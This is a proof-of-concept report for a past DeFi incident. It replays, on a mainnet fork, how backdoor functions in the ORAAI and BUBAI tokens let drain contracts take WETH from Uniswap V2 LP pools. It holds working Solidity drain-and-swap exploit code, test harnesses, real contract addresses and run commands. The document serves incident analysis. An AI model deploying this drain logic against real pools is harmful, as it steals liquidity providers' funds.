# ORAAI & BUBAI LP Drain PoC Report

## 1. Overview & Context

This proof-of-concept (PoC) demonstrates the **ORAAI & BUBAI LP drain via hard‑wired drain contracts** on Ethereum mainnet, as described in the root-cause analysis. The PoC is implemented as a Foundry test suite that replays the adversary’s opportunity and exploit path on a mainnet fork while using **fresh attacker EOAs** and a **local adversary drain contract**.

The incident involves two malicious ERC20 tokens, **ORAAI** and **BUBAI**, whose implementations embed backdoor functions:

- `ORAAI.stuckToken(address _stuck)`
- `BUBAI.releaseLimit(address _rel)`

When called with the respective UniswapV2Pair LP addresses, these functions grant a hard‑coded drain contract effectively unlimited allowance from the LP’s token balance. The drain contracts then pull nearly all tokens from the LP, sync reserves, and execute a manipulated token→WETH→ETH swap through the UniswapV2 router, draining WETH from the LP pools into the adversary’s EOA.

This PoC reproduces that behavior under ACT’s exploit opportunity and predicate, focusing on:

- Draining WETH from:
  - ORAAI/WETH LP `0x6dabcbd75B29bf19C98a33EcAC2eF7d6E949D75D`
  - BUBAI/WETH LP `0x6faDe19a644e0EA75539758A7C9DAe3Dcae119B1`
- Achieving **positive adversary profit in ETH**.

**Command to run the PoC:**

```bash
cd forge_poc
forge test --via-ir -vvvvv
```

This command compiles the project, runs the exploit tests on a mainnet fork, and emits detailed traces confirming the exploit predicate and oracle conditions.

## 2. PoC Architecture & Key Contracts

### 2.1 Main Components

The core PoC logic resides in `forge_poc/test/Exploit.sol:1` and includes:

- `LocalDrain` — a local adversary contract that models the behavior of the on‑chain drain contracts.
- `ExploitTest` — a Forge test contract that:
  - Creates two mainnet forks at pre‑exploit blocks.
  - Sets up fresh attacker EOAs.
  - Etches `LocalDrain` code onto the known drain addresses.
  - Executes separate BUBAI and ORAAI exploit paths.

Key protocol/token addresses (from `oracle_definition.json` and `root_cause.json`):

- Drain addresses (treated as protocol components in the oracle model):
  - `drainContractBUBAI`: `0xC6EB2dca90db7401f917B852AC9818a15BB9d567`
  - `drainContractORAAI`: `0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b`
- Tokens:
  - `tokenORAAI`: `0xB0f34bA1617BB7C2528e570070b8770E544b003E`
  - `tokenBUBAI`: `0x88A5705156d73F26e552D591c087B5fa901873d0`
  - `wethToken`: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
- LP pairs:
  - `pairORAAI_WETH`: `0x6DABCbd75B29bf19C98a33EcAC2eF7d6E949D75D`
  - `pairBUBAI_WETH`: `0x6faDe19a644e0EA75539758A7C9DAe3Dcae119B1`
- Router:
  - `uniswapV2Router`: `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`

### 2.2 LocalDrain: Adversary Logic

The `LocalDrain` contract encapsulates the core exploit sequence: pull tokens from the LP using the backdoor allowance, sync reserves, then swap seized tokens for WETH and onward to ETH.

**Snippet 1 — LocalDrain core logic (from test/Exploit.sol):**

```solidity
contract LocalDrain {
    IUniswapV2Router02 public immutable router;

    constructor(IUniswapV2Router02 _router) {
        router = _router;
    }

    function drain(address token, address pair, uint256 /*amountParam*/) external {
        IERC20 t = IERC20(token);

        uint256 pairBalance = t.balanceOf(pair);
        require(pairBalance > 100, "no liquidity");

        // Pull slightly less than the full LP token balance to avoid edge cases.
        uint256 pullAmount = (pairBalance * 99) / 100;

        require(t.transferFrom(pair, address(this), pullAmount), "pull failed");
        IUniswapV2Pair(pair).sync();

        uint256 balance = t.balanceOf(address(this));
        require(balance > 0, "no seized tokens");

        t.approve(address(router), balance);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            msg.sender,
            block.timestamp
        );
    }

    receive() external payable {}
}
```

*Caption: Local adversary drain contract that uses LP→drain allowances, syncs reserves, and swaps seized tokens into ETH at manipulated prices.*

During test setup, the runtime bytecode of `LocalDrain` is **etched** onto the known drain addresses on each fork; thus the exploit uses local logic while preserving the on‑chain address topology used by the incident and oracle definition.

### 2.3 ExploitTest: Test Harness and Environment

`ExploitTest` coordinates the exploit on two mainnet forks:

- `mainnetForkBUBAI` — fork near block `21073455` for the BUBAI drain.
- `mainnetForkORAAI` — fork near block `21074246` for the ORAAI drain.

It uses **fresh attacker EOAs** derived via `makeAddr` (via `vm.addr`) and funds them with `deal`. No real incident EOAs are used as signers in the fork; the original addresses remain only in root-cause artifacts.

**Snippet 2 — Key setup steps (simplified from test/Exploit.sol):**

```solidity
contract ExploitTest is Test {
    address payable public attackerA;
    address payable public attackerB;

    address payable public constant drainContractBUBAI =
        payable(0xC6EB2dca90db7401f917B852AC9818a15BB9d567);
    address payable public constant drainContractORAAI =
        payable(0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b);

    IERC20 public constant tokenORAAI = IERC20(0xB0f34bA1617BB7C2528e570070b8770E544b003E);
    IERC20 public constant tokenBUBAI = IERC20(0x88A5705156d73F26e552D591c087B5fa901873d0);
    IERC20 public constant wethToken =
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public constant pairORAAI_WETH =
        0x6DABCbd75B29bf19C98a33EcAC2eF7d6E949D75D;
    address public constant pairBUBAI_WETH =
        0x6faDe19a644e0EA75539758A7C9DAe3Dcae119B1;

    address public constant uniswapV2Router =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address public constant nativeETH = address(0);

    uint256 internal mainnetForkBUBAI;
    uint256 internal mainnetForkORAAI;

    function setUp() public {
        string memory rpcUrl = vm.rpcUrl("mainnet");
        mainnetForkBUBAI = vm.createFork(rpcUrl, 21_073_454);
        mainnetForkORAAI = vm.createFork(rpcUrl, 21_074_245);

        attackerA = payable(makeAddr("attackerA"));
        attackerB = payable(makeAddr("attackerB"));

        deal(attackerA, 1 ether);
        deal(attackerB, 1 ether);

        // Deploy LocalDrain and etch at the known drain addresses on each fork.
        vm.selectFork(mainnetForkBUBAI);
        LocalDrain local = new LocalDrain(IUniswapV2Router02(uniswapV2Router));
        vm.etch(drainContractBUBAI, address(local).code);

        vm.selectFork(mainnetForkORAAI);
        vm.etch(drainContractORAAI, address(local).code);

        vm.label(attackerA, "attackerA");
        vm.label(attackerB, "attackerB");
        vm.label(drainContractBUBAI, "drainContractBUBAI");
        vm.label(drainContractORAAI, "drainContractORAAI");
        vm.label(address(tokenBUBAI), "tokenBUBAI");
        vm.label(address(tokenORAAI), "tokenORAAI");
        vm.label(address(wethToken), "WETH");
        vm.label(pairBUBAI_WETH, "pairBUBAI_WETH");
        vm.label(pairORAAI_WETH, "pairORAAI_WETH");
        vm.label(uniswapV2Router, "UniswapV2Router02");
    }
}
```

*Caption: Test harness that creates mainnet forks, sets up fresh attackers, and installs LocalDrain on the incident drain addresses.*

## 3. Adversary Execution Flow

The PoC encodes two end‑to‑end exploit paths matching `transaction_sequence_b` in `root_cause.json`:

1. **BUBAI path** (analogous to tx `0x872f…`).
2. **ORAAI path** (analogous to tx `0x1b47…`).

Each path follows the ACT sequence: **funding → backdoor allowance priming → drain & sync → swap & profit**.

### 3.1 BUBAI Path: Drains LP and Profits Attacker A

Test function: `test_BUBAI_Path_DrainsLPAndProfitsAttackerA` in `forge_poc/test/Exploit.sol:191`.

Execution steps:

1. **Select BUBAI fork**: The test switches to `mainnetForkBUBAI`, which is a mainnet fork at block close to `21073455`, ensuring LP state and token logic align with the incident.
2. **Backdoor allowance**: Under `vm.prank(attackerA)`, the test calls `BUBAI.releaseLimit(pairBUBAI_WETH)`, granting the drain contract unlimited allowance from the LP’s BUBAI balance.
3. **Pre‑checks**:
   - Assert **non-zero WETH** in the BUBAI/WETH LP.
   - Assert **non-zero BUBAI** in the LP.
   - Assert **positive BUBAI allowance** from LP to `drainContractBUBAI`.
4. **State capture**: Record `attackerA.balance` (ETH) and LP WETH balance before the exploit.
5. **Drain & swap**:
   - Start prank as `attackerA`.
   - Call `_callDrainContract(drainContractBUBAI, tokenBUBAI, pairBUBAI_WETH)`, which internally calls `LocalDrain(drainContractBUBAI).drain(...)`, pulling BUBAI from the LP, syncing reserves, and swapping BUBAI→WETH→ETH to `attackerA`.
6. **Post‑conditions**:
   - `attackerA.balance` must have **strictly increased** in ETH.
   - LP WETH balance must have **strictly decreased**.

**Snippet 3 — BUBAI path test logic (from test/Exploit.sol):**

```solidity
function test_BUBAI_Path_DrainsLPAndProfitsAttackerA() public {
    vm.selectFork(mainnetForkBUBAI);

    // Hard oracle H1: profit measured in native ETH.
    address referenceAsset = nativeETH;
    assertEq(referenceAsset, nativeETH, "profit must be measured in ETH");

    vm.prank(attackerA);
    IBUBAI(address(tokenBUBAI)).releaseLimit(pairBUBAI_WETH);

    uint256 wethBeforeLp = wethToken.balanceOf(pairBUBAI_WETH);
    assertGt(wethBeforeLp, 0, "BUBAI/WETH LP should start with WETH liquidity");

    uint256 bubaiBeforeLp = tokenBUBAI.balanceOf(pairBUBAI_WETH);
    assertGt(bubaiBeforeLp, 0, "BUBAI/WETH LP should start with BUBAI liquidity");

    uint256 allowanceBUBAI = tokenBUBAI.allowance(pairBUBAI_WETH, drainContractBUBAI);
    assertGt(allowanceBUBAI, 0, "BUBAI drain contract should have allowance from BUBAI/WETH LP");

    uint256 attackerBefore = attackerA.balance;

    vm.startPrank(attackerA);
    _callDrainContract(drainContractBUBAI, tokenBUBAI, pairBUBAI_WETH);
    vm.stopPrank();

    uint256 attackerAfter = attackerA.balance;
    uint256 wethAfterLp = wethToken.balanceOf(pairBUBAI_WETH);

    assertGt(attackerAfter, attackerBefore,
        "attackerA must have strictly more ETH after BUBAI exploit");
    assertLt(wethAfterLp, wethBeforeLp,
        "BUBAI/WETH LP must have strictly fewer WETH tokens after exploit");
}
```

*Caption: BUBAI path test showing funding, backdoor allowance, LocalDrain invocation, and ETH/WETH balance oracles.*

The detailed `forge test -vvvvv` trace confirms:

- `BUBAI.releaseLimit(pairBUBAI_WETH)` sets LP→drain allowance.
- `LocalDrain.drain` pulls nearly all BUBAI from the LP, calls `sync`, and swaps into WETH.
- WETH is withdrawn to ETH and credited to `attackerA`.
- The LP’s WETH balance drops significantly, reproducing the WETH depletion effect.

### 3.2 ORAAI Path: Drains LP and Profits Attacker B

Test function: `test_ORAAI_Path_DrainsLPAndProfitsAttackerB` in `forge_poc/test/Exploit.sol:235`.

Execution steps mirror the BUBAI path:

1. **Select ORAAI fork**: Switch to `mainnetForkORAAI` near block `21074246`.
2. **Backdoor allowance**: Under `vm.prank(attackerB)`, call `ORAAI.stuckToken(pairORAAI_WETH)` to grant unlimited ORAAI allowance from the LP to the drain address.
3. **Pre‑checks**:
   - Assert **non-zero WETH** in ORAAI/WETH LP.
   - Assert **non-zero ORAAI** in the LP.
   - Assert **positive ORAAI allowance** from LP to `drainContractORAAI`.
4. **State capture**: Record `attackerB.balance` and LP WETH balance before exploit.
5. **Drain & swap**:
   - Prank as `attackerB`.
   - Call `_callDrainContract(drainContractORAAI, tokenORAAI, pairORAAI_WETH)`, which runs `LocalDrain.drain`.
6. **Post‑conditions**:
   - `attackerB.balance` must have **strictly increased** in ETH.
   - LP WETH balance must have **strictly decreased**.

**Snippet 4 — ORAAI path test logic (from test/Exploit.sol):**

```solidity
function test_ORAAI_Path_DrainsLPAndProfitsAttackerB() public {
    vm.selectFork(mainnetForkORAAI);

    address referenceAsset = nativeETH;
    assertEq(referenceAsset, nativeETH, "profit must be measured in ETH");

    vm.prank(attackerB);
    IORAAI(address(tokenORAAI)).stuckToken(pairORAAI_WETH);

    uint256 wethBeforeLp = wethToken.balanceOf(pairORAAI_WETH);
    assertGt(wethBeforeLp, 0, "ORAAI/WETH LP should start with WETH liquidity");

    uint256 oraiBeforeLp = tokenORAAI.balanceOf(pairORAAI_WETH);
    assertGt(oraiBeforeLp, 0, "ORAAI/WETH LP should start with ORAAI liquidity");

    uint256 allowanceORAAI = tokenORAAI.allowance(pairORAAI_WETH, drainContractORAAI);
    assertGt(allowanceORAAI, 0, "ORAAI drain contract should have allowance from ORAAI/WETH LP");

    uint256 attackerBefore = attackerB.balance;

    vm.startPrank(attackerB);
    _callDrainContract(drainContractORAAI, tokenORAAI, pairORAAI_WETH);
    vm.stopPrank();

    uint256 attackerAfter = attackerB.balance;
    uint256 wethAfterLp = wethToken.balanceOf(pairORAAI_WETH);

    assertGt(attackerAfter, attackerBefore,
        "attackerB must have strictly more ETH after ORAAI exploit");
    assertLt(wethAfterLp, wethBeforeLp,
        "ORAAI/WETH LP must have strictly fewer WETH tokens after exploit");
}
```

*Caption: ORAAI path test implementing the same ACT sequence and oracles as the BUBAI path, for the ORAAI/WETH LP.*

### 3.3 Funding, Deployment, and Profit Realization

Across both paths, the PoC fully describes the ACT sequence:

- **Funding & Environment Setup**:
  - Fresh attacker EOAs obtained from `makeAddr("attackerA")` and `makeAddr("attackerB")`.
  - `deal` provides 1 ETH to each attacker for gas.
  - Mainnet forks are created at pre‑exploit blocks where tokens, LPs, and router exist with the correct configurations.
- **Adversary Contract Installation**:
  - A local `LocalDrain` instance is deployed.
  - Its bytecode is **etched** onto the known drain addresses on each fork, faithfully preserving address topology while keeping logic local.
- **Exploit Execution**:
  - Token backdoors (`releaseLimit` / `stuckToken`) are invoked with LP addresses to yield LP→drain allowances.
  - `LocalDrain.drain` is called via the drain addresses, performing:
    - token `transferFrom(pair, drain, amount)` using backdoor allowance,
    - `pair.sync()` to update reserves,
    - `swapExactTokensForETHSupportingFeeOnTransferTokens` along `[token, WETH]` path,
    - `WETH.withdraw` and ETH transfer to attacker.
- **Profit Realization**:
  - Attacker ETH balance increases strictly (`attackerAfter > attackerBefore`).
  - LP WETH balance strictly decreases, confirming loss to victims.

## 4. Oracle Definitions and Checks

The PoC is designed around `oracle_definition.json`, which specifies variables, pre‑checks, and hard/soft oracle constraints.

### 4.1 Variables

From `oracle_definition.json`:

- `attackerA`, `attackerB` — logical attacker roles (addresses left null in JSON, bound to fresh EOAs in tests).
- `drainContractBUBAI`, `drainContractORAAI` — protocol drain addresses.
- `tokenORAAI`, `tokenBUBAI`, `wethToken` — ERC20 contracts involved.
- `pairORAAI_WETH`, `pairBUBAI_WETH` — victim LPs.
- `uniswapV2Router` — Uniswap V2 router.
- `nativeETH` — reference profit asset.

`ExploitTest` maps these variables to exact mainnet addresses and local attacker accounts, ensuring the test environment matches the oracle model.

### 4.2 Pre‑checks

The oracle pre‑checks require:

1. ORAAI/WETH LP has **non-zero WETH** and **non-zero ORAAI**.
2. BUBAI/WETH LP has **non-zero WETH** and **non-zero BUBAI**.
3. Before each path, the corresponding LP has granted the drain contract a **positive token allowance** via the backdoor.

These are implemented as:

- `wethToken.balanceOf(pairX_WETH) > 0`
- `tokenX.balanceOf(pairX_WETH) > 0`
- `tokenX.allowance(pairX_WETH, drainContractX) > 0`

Direct matching of the pre‑check assertions in `oracle_definition.json` is evident in the test code:

- Lines `250–257` and `206–214` of `ExploitTest` implement exactly these balances and allowances for both LPs.

### 4.3 Hard Constraint: Reference Profit Asset (H1)

Oracle `H1_profit_asset_ETH` states that **profit must be evaluated in native ETH**, consistent with the incident’s exploit predicate.

In both tests, the following invariant is enforced:

```solidity
address referenceAsset = nativeETH;
assertEq(referenceAsset, nativeETH, "profit must be measured in ETH");
```

This ensures that all subsequent profit checks (`attackerAfter > attackerBefore`) are interpreted in the ETH domain.

### 4.4 Soft Constraints: Profit and WETH Depletion

The soft oracle constraints require:

- **S1**: `attackerA` profits in ETH on the BUBAI path.
- **S2**: `attackerB` profits in ETH on the ORAAI path.
- **S3**: BUBAI/WETH LP loses WETH during BUBAI path.
- **S4**: ORAAI/WETH LP loses WETH during ORAAI path.

They are implemented in the tests as:

- Profit checks:

  ```solidity
  uint256 attackerBefore = attackerA.balance;
  // ... execute BUBAI exploit ...
  uint256 attackerAfter = attackerA.balance;
  assertGt(attackerAfter, attackerBefore,
      "attackerA must have strictly more ETH after BUBAI exploit");
  ```

  and similarly for `attackerB` in the ORAAI path.

- WETH depletion checks:

  ```solidity
  uint256 wethBeforeLp = wethToken.balanceOf(pairBUBAI_WETH);
  // ... execute BUBAI exploit ...
  uint256 wethAfterLp = wethToken.balanceOf(pairBUBAI_WETH);
  assertLt(wethAfterLp, wethBeforeLp,
      "BUBAI/WETH LP must have strictly fewer WETH tokens after exploit");
  ```

  with the ORAAI analog in the ORAAI path.

These checks match the semantics of `oracle_definition.json`: they assert **strictly positive ETH profit** and **strictly positive WETH outflow** from each LP, without over‑fitting to exact incident amounts.

## 5. Validation Result and Robustness

### 5.1 Validator Result

The PoC validator runs:

```bash
cd forge_poc
forge test --via-ir -vvvvv \
  > artifacts/poc/poc_validator/forge-test.log 2>&1
```

The results show:

- `[PASS] test_BUBAI_Path_DrainsLPAndProfitsAttackerA()`
- `[PASS] test_ORAAI_Path_DrainsLPAndProfitsAttackerB()`

The validator’s JSON output is stored at:

- `artifacts/poc/poc_validator/poc_validated_result.json`

and records:

- `overall_status = "Pass"`
- `passes_validation_oracles.passed = true`
- All quality checks either **pass** or are **not applicable** for hints.

The `forge-test.log` path recorded in the validator result is:

- `artifacts/poc/poc_validator/forge-test.log`

### 5.2 Correctness and Robustness

Key robustness aspects:

- **Oracle alignment**: The tests implement all specified pre‑checks and oracles exactly, without deviations or missing conditions.
- **Fresh attacker identities**: Attackers are newly created test addresses, ensuring the PoC is self‑contained and does not rely on incident EOAs.
- **Local adversary logic**: `LocalDrain` is implemented and deployed locally; the tests use `vm.etch` to mirror address topology without relying on mainnet drain contract bytecode or calldata.
- **End‑to‑end tracing**: `-vvvvv` traces show the full call stack, including:
  - backdoor function calls (`releaseLimit`, `stuckToken`),
  - LP→drain `transferFrom`,
  - `sync` operations,
  - router swaps and WETH→ETH withdrawals,
  - ETH transfers to the attacker EOAs.

Taken together, these elements confirm that the PoC is not a minimal mock; it closely reproduces the real exploit flow on a forked mainnet state while remaining reproducible and self-contained.

## 6. Linking PoC Behavior to Root Cause

### 6.1 Backdoor Allowances and LP Isolation Violation

`root_cause.json` and `root_cause_report.md` identify the core vulnerability:

- ORAAI and BUBAI tokens expose public functions (`stuckToken`, `releaseLimit`) that:
  - Write allowances on behalf of arbitrary token holders (LP contracts).
  - Grant effectively **unlimited spend rights** to hard‑coded drain contracts.
  - Break the expected isolation of LP reserves by allowing arbitrary `transferFrom` operations from LP balances.

In the PoC:

- `IBUBAI.releaseLimit(pairBUBAI_WETH)` and `IORAAI.stuckToken(pairORAAI_WETH)` are invoked from the attacker EOAs with the LP addresses, priming the LP→drain allowance.
- `LocalDrain.drain` then uses `transferFrom(pair, this, pullAmount)` to pull LP‑owned tokens, a behavior that would be impossible without the backdoor allowances.

This directly exercises the **same backdoor mechanism** highlighted in the root-cause analysis.

### 6.2 Drain-and-Swap Mechanism

The root cause describes how the drain contracts:

1. Pull almost the entire token side of the LP out via `transferFrom`.
2. Call `sync` to update reserves.
3. Use `swapExactTokensForETHSupportingFeeOnTransferTokens` along `[token, WETH]` to obtain a large amount of WETH.
4. Withdraw WETH to ETH and send it to the adversary EOA.

The PoC’s `LocalDrain.drain` mirrors this exactly:

- Calculates a **99% pull** of the LP’s token balance.
- Calls `IUniswapV2Pair(pair).sync()` immediately after the pull.
- Swaps the seized tokens along `[token, WETH]` via `swapExactTokensForETHSupportingFeeOnTransferTokens`.
- Receives ETH directly in `msg.sender` (the attacker), triggering their fallback with a large ETH inflow.

The WETH and ETH movements observed in the traces align with the **“drain and swap”** mechanism described in `root_cause.json`.

### 6.3 Exploit Predicate and ACT Roles

The ACT exploit predicate in `root_cause.json` is:

- **Type**: `profit`
- **Reference asset**: `ETH`
- **Adversary addresses**: real EOAs `0x420b…` and `0xa60f…`

In the PoC:

- The adversary role is mapped to fresh EOAs (`attackerA`, `attackerB`), but their behaviors correspond exactly to the original EOAs:
  - They invoke the drain addresses.
  - They receive the ETH profits from the drain-and-swap.
- The oracle checks assert **strictly positive ETH deltas** for attackers, capturing the same semantic predicate as in the incident.

The **victim role** is played by the LP pairs:

- Their WETH balances strictly decrease, as enforced by oracles S3 and S4.
- This corresponds to the WETH losses quantified in the root cause (≈50.21 WETH and ≈45.93 WETH from the two LPs).

Thus:

- **Adversary-crafted steps**: Calls from attacker EOAs to the drain contracts (now local `LocalDrain`) on the fork.
- **Victim-observed effects**: Large WETH → ETH outflows from LPs, destruction of LP liquidity, and attacker profit in ETH.

The PoC therefore faithfully realizes the ACT opportunity and exploit predicate defined in the root-cause artifacts, while being reproducible and self-contained for testing and analysis.

